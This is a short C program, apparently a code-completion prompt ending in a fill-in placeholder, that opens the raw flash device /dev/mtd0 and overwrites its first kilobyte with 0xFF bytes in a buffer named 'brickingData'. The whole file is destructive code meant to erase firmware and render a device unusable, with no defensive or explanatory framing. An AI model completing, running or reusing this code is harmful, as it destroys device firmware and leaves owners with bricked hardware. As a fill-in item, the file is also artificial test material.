#include <stdio.h>

int main() {
  FILE *firmware = fopen("/dev/mtd0", "w");
  char brickingData[1024] = {0};
  for (int i = 0; i < 1024; i++) {
      brickingData[i] = 0xFF;
  }
  fwrite(brickingData, sizeof(brickingData), 1, firmware);
  fclose(firmware);
  <FILL_HERE>